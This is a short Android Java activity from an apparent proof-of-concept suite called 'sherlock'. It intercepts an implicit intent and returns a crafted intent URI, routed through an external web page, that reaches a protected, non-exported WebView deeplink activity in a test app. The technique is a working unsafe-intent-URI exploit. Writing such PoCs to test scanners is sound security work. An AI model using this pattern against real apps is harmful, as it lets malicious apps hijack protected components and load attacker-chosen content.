package sherlock.poc.unsafe_intent_uri.webview;

import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;

import androidx.appcompat.app.AppCompatActivity;

public class InterceptImplicitIntentActivity extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        Intent target = new Intent();
        target.setAction("android.intent.action.VIEW");
        target.setData(Uri.parse("sherlock://protected.components?url=https://www.netflix.com"));
        target.setClassName("sherlock.test", "sherlock.test.protected_components.ProtectedWebViewDeeplinkActivity");

        String intentUri = target.toUri(Intent.URI_INTENT_SCHEME);
        String url = "https://sherlock-93f40.web.app/?url=" + Uri.encode(intentUri);

        Bundle bundle = new Bundle();
        bundle.putString("url", url);

        Intent i = new Intent();
        i.setData(Uri.parse(url));
        i.putExtra("url", url);
        i.putExtra("bundle", bundle);
        setResult(-1, i);
        finish();
    }
}